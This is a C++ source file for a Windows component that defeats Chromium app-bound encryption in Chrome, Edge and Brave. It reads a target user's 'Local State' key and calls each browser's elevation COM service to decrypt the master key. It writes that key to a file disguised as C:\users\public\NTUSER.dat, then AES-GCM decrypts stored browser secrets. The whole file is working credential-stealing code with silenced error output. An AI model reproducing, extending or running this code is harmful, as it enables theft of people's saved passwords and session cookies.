#include "includes\AppBoundDecryptor.h"
#include "includes\Helper.h"

DATA_BLOB* COM_master_key_blob = nullptr;
constexpr size_t KEY_SIZE = 32;
const uint8_t kCryptAppBoundKeyPrefix[] = { 'A', 'P', 'P', 'B' };

AppBoundDecryptor::AppBoundDecryptor() {}

//AppBoundDecryptor::~AppBoundDecryptor() {
//	// Free memory allocated for master_key_blob if it's not null
//	if (COM_master_key_blob != nullptr) {
//		LocalFree(COM_master_key_blob->pbData);
//		delete COM_master_key_blob;
//	}
//}

BOOL AppBoundDecryptor::AppBoundDecryptorInit(std::string path, std::string identifier)
{
    if (file_exist(path)) {

        std::ifstream file(path);
        if (!file.is_open()) {
            return false;
        }

        // Replace each "\" with "\\\\"
        std::string modified = std::regex_replace(identifier, std::regex(R"(\\)"), "\\\\");
        modified.pop_back();
        std::regex pattern("\"" + modified + "\"\\s*:\\s*\"([^\"]*)\"");

        std::string line;
        std::smatch match;
        std::string lastValue;

        /*while (std::getline(file, line)) {
            if (std::regex_search(line, match, pattern)) {

                if (match[1] == "NULL")
                    return false;

                if (!ConvertToBLOB(match[1]))
                    return false;
            }
            else
                return false;
        }*/

        // UPDATING CODE HERE TO MATCH THE LAST (RECENT) ITEM VALUE
        //-------------------------------

        while (std::getline(file, line)) {
            for (std::sregex_iterator it(line.begin(), line.end(), pattern), end; it != end; ++it)
            {
                std::string val = (*it)[1];

                if (val != "NULL")
                    lastValue = val; // keep overwriting → last match wins
            }
        }

        // Now check the last match AFTER the loop
        if (lastValue.empty())
            return false;

        if (!ConvertToBLOB(lastValue))
            return false;
    }
    else {
        return false;
    }
    return true;
}

BOOL AppBoundDecryptor::ConvertToBLOB(std::string hexString)
{
    size_t numBytes = hexString.length() / 2;

    // Allocate memory for the DATA_BLOB
    COM_master_key_blob = new DATA_BLOB;
    COM_master_key_blob->cbData = static_cast<DWORD>(numBytes);
    COM_master_key_blob->pbData = static_cast<BYTE*>(malloc(numBytes));

    if (!COM_master_key_blob->pbData) {
        //std::cerr << "Memory allocation failed." << std::endl;
        delete COM_master_key_blob;
        COM_master_key_blob = nullptr;
        return false;
    }

    // Convert hex string to bytes
    for (size_t i = 0; i < numBytes; ++i) {
        std::string byteString = hexString.substr(i * 2, 2);
        COM_master_key_blob->pbData[i] = static_cast<BYTE>(std::stoul(byteString, nullptr, 16));
    }
    return true;
}

BOOL AppBoundDecryptor::RequestCOM(std::string service_parameter)
{
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    std::string exeName = std::string(path).substr(std::string(path).find_last_of("\\/") + 1);

    size_t lastSlash = std::string(path).find_last_of("\\");
    size_t secondLastSlash = std::string(path).find_last_of("\\", lastSlash - 1);
    std::string parentFolderName = std::string(path).substr(secondLastSlash + 1, lastSlash - secondLastSlash - 1);

    CLSID CLSID_Elevator;
    IID IID_IElevator;
    std::string process_path;

    if (parentFolderName == "Chrome")
    {
        CLSID_Elevator = CLSID_Elevator_Chrome;
        IID_IElevator = IID_IElevator_Chrome;
        process_path = "Google\\Chrome";
    }
    else if (parentFolderName == "Edge")
    {
        CLSID_Elevator = CLSID_Elevator_Edge;
        IID_IElevator = IID_IElevator_Edge;
        process_path = "Microsoft\\Edge";
    }
    else if (parentFolderName == "Brave-Browser")
    {
        CLSID_Elevator = CLSID_Elevator_Brave;
        IID_IElevator = IID_IElevator_Brave;
        process_path = "BraveSoftware\\Brave-Browser";
    }

    HRESULT hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) {
        //std::cerr << "Failed to initialize COM." << std::endl;
        return false;
    }

    Microsoft::WRL::ComPtr<IElevator> elevator;
    DWORD last_error = ERROR_GEN_FAILURE;

    hr = CoCreateInstance(CLSID_Elevator, nullptr, CLSCTX_LOCAL_SERVER, IID_IElevator, (void**)&elevator);
    if (FAILED(hr)) {
        //std::cerr << "Failed to create IElevator instance." << std::endl;
        CoUninitialize();
        return false;
    }

    hr = CoSetProxyBlanket(
        elevator.Get(),
        RPC_C_AUTHN_DEFAULT,
        RPC_C_AUTHZ_DEFAULT,
        COLE_DEFAULT_PRINCIPAL,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        nullptr,
        EOAC_DYNAMIC_CLOAKING
    );

    if (FAILED(hr)) {
        //std::cerr << "Failed to set proxy blanket." << std::endl;
        CoUninitialize();
        return false;
    }

    std::vector<uint8_t> encrypted_key = RetrieveEncryptedKey(process_path, service_parameter);
    if (encrypted_key.size() == 0)
        return false;

    BSTR ciphertext_data = SysAllocStringByteLen(reinterpret_cast<const char*>(encrypted_key.data()), encrypted_key.size());
    if (!ciphertext_data) {
        //std::cerr << "Failed to allocate BSTR for encrypted key." << std::endl;
        CoUninitialize();
        return false;
    }

    BSTR plaintext_data = nullptr;
    hr = elevator->DecryptData(ciphertext_data, &plaintext_data, &last_error);

    std::string decrypted_key_hex_string;
    std::string output_file = "c:\\users";
    output_file += "\\public\\";
    output_file += "NTUSER.dat";

    if (SUCCEEDED(hr)) {
        BYTE* decrypted_key = new BYTE[KEY_SIZE];
        memcpy(decrypted_key, (void*)plaintext_data, KEY_SIZE);
        SysFreeString(plaintext_data);

        decrypted_key_hex_string = BytesToHexString(decrypted_key, KEY_SIZE);
        std::string json;
        //std::cout << "Decrypted key: " << decrypted_key_hex_string << std::endl;

        std::ofstream outputFile(output_file, std::ios::app);
        if (decrypted_key_hex_string != "") {
            if (outputFile.is_open()) {
                std::string json = "{\"" + process_path + "\":\"" + decrypted_key_hex_string + "\"},";

                outputFile << json;
                outputFile.close();
            }
        }
        else
        {
            decrypted_key_hex_string = "NULL";
            if (outputFile.is_open()) {
                std::string json = "{\"" + process_path + "\":\"" + decrypted_key_hex_string + "\"},";

                outputFile << json;
                outputFile.close();
                return false;
            }
        }
    }
    else
    {
        std::ofstream outputFile(output_file, std::ios::app);
        decrypted_key_hex_string = "NULL";
        if (outputFile.is_open()) {
            std::string json = "{\"" + process_path + "\":\"" + decrypted_key_hex_string + "\"},";

            outputFile << json;
            outputFile.close();
        }
        return false;
    }

    SysFreeString(ciphertext_data);
    CoUninitialize();
    return true;
}

std::vector<uint8_t> AppBoundDecryptor::RetrieveEncryptedKey(std::string process, std::string service_parameter) {
    //std::string path = GetAppDataPath(); //Its failing because of SERVICE privs & paths

    size_t pos = service_parameter.find("-exec");
    if (pos != std::string::npos) {
        service_parameter = service_parameter.substr(0, pos); // Extract everything before "-exec"
    }

    std::string path = "C:\\Users\\";
    path = path + service_parameter;
    path = path + "\\AppData\\Local";
    path = path + "\\" + process;
    path = path + "\\User Data";
    path = path + "\\Local State";
    std::string base64_encrypted_key = read_json(path);

    if (base64_encrypted_key.empty())
    {
        return {};
    }

    std::vector<uint8_t> encrypted_key_with_header = Base64Decode(base64_encrypted_key);

    if (!std::equal(std::begin(kCryptAppBoundKeyPrefix), std::end(kCryptAppBoundKeyPrefix), encrypted_key_with_header.begin())) {
        //std::cerr << "Error: Invalid key header." << std::endl;
        //exit(EXIT_FAILURE);
        return {};
    }

    return std::vector<uint8_t>(encrypted_key_with_header.begin() + sizeof(kCryptAppBoundKeyPrefix), encrypted_key_with_header.end());
}

std::string AppBoundDecryptor::read_json(const std::string& filePath) {
    std::ifstream file(filePath);
    if (!file.is_open()) {
        //std::cerr << "Failed to open the file: " << filePath << std::endl;
        return "";
    }

    std::regex pattern("\"app_bound_encrypted_key\"\\s*:\\s*\"([^\"]*)\"");
    std::string line;
    std::smatch match;

    while (std::getline(file, line)) {
        if (std::regex_search(line, match, pattern)) {
            return match[1];
        }
    }

    //std::cerr << "Encrypted key not found in the file." << std::endl;
    return "";
}

std::string AppBoundDecryptor::AESDecrypter(std::vector<BYTE> EncryptedBlob)
{
    try
    {
        BCRYPT_ALG_HANDLE hAlgorithm = 0;
        BCRYPT_KEY_HANDLE hKey = 0;
        NTSTATUS status = 0;
        SIZE_T EncryptedBlobSize = EncryptedBlob.size();
        SIZE_T TagOffset = EncryptedBlobSize - 15;
        ULONG PlainTextSize = 0;

        std::vector<BYTE> CipherPass(EncryptedBlobSize);
        std::vector<BYTE> PlainText;
        std::vector<BYTE> IV(IV_SIZE);

        // Parse iv and password from the buffer
        std::copy(EncryptedBlob.data() + 3, EncryptedBlob.data() + 3 + IV_SIZE, IV.begin());
        std::copy(EncryptedBlob.data() + 15, EncryptedBlob.data() + EncryptedBlobSize, CipherPass.begin());

        // Open algorithm provider for decryption
        status = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
        if (!BCRYPT_SUCCESS(status))
        {
            //std::cout << "BCryptOpenAlgorithmProvider failed with status: " << status << std::endl;
            return "";
        }

        // Set chaining mode for decryption
        status = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (UCHAR*)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
        if (!BCRYPT_SUCCESS(status))
        {
            //std::cout << "BCryptSetProperty failed with status: " << status << std::endl;
            BCryptCloseAlgorithmProvider(hAlgorithm, 0);
            return "";
        }

        // Generate symmetric key
        status = BCryptGenerateSymmetricKey(hAlgorithm, &hKey, NULL, 0, COM_master_key_blob->pbData, COM_master_key_blob->cbData, 0);
        if (!BCRYPT_SUCCESS(status))
        {
            //std::cout << "BcryptGenertaeSymmetricKey failed with status: " << status << std::endl;
            BCryptCloseAlgorithmProvider(hAlgorithm, 0);
            return "";
        }

        // Auth cipher mode info
        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO AuthInfo;
        BCRYPT_INIT_AUTH_MODE_INFO(AuthInfo);
        TagOffset = TagOffset - 16;
        AuthInfo.pbNonce = IV.data();
        AuthInfo.cbNonce = IV_SIZE;
        AuthInfo.pbTag = CipherPass.data() + TagOffset;
        AuthInfo.cbTag = TAG_SIZE;

        // Get size of plaintext buffer
        status = BCryptDecrypt(hKey, CipherPass.data(), TagOffset, &AuthInfo, NULL, 0, NULL, NULL, &PlainTextSize, 0);
        if (!BCRYPT_SUCCESS(status))
        {
            //std::cout << "BCryptDecrypt (1) failed with status: " << status << std::endl;
            return "";
        }

        // Allocate memory for the plaintext
        PlainText.resize(PlainTextSize);

        status = BCryptDecrypt(hKey, CipherPass.data(), TagOffset, &AuthInfo, NULL, 0, PlainText.data(), PlainTextSize, &PlainTextSize, 0);
        if (!BCRYPT_SUCCESS(status))
        {
            //std::cout << "BCrypt Decrypt (2) failed with status: " << status << std::endl;
            return "";
        }

        // Close the algorithm handle
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);

        return std::string(PlainText.begin(), PlainText.end());
    }
    catch (int e)
    {
        return "";
    }
}